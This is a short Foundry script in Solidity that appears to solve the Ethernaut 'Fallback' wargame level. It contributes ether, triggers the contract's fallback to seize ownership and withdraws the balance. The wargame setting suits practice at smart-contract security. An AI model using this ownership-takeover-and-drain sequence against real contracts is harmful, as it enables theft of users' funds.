// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.12;

import {Ethernaut} from './base.sol';
import 'forge-std/Test.sol';

interface IFallback {
  function owner() external view returns (address);
  function contribute() external payable;
  function getContribution() external view returns (uint);
  function withdraw() external;
}

contract Fallback is Ethernaut {

  function run() public {
    vm.startBroadcast();

    // Create Instance
    IFallback fallbackContract = IFallback(createNewInstance(FALLBACK));
    // Task
    fallbackContract.contribute{value: 0.0005 ether}();
    (bool success,) = address(fallbackContract).call{value: 0.0005 ether}("");
    require(success);
    fallbackContract.withdraw();

    // Submission
    submitInstance(FALLBACK, address(fallbackContract));

    vm.stopBroadcast();
  }
}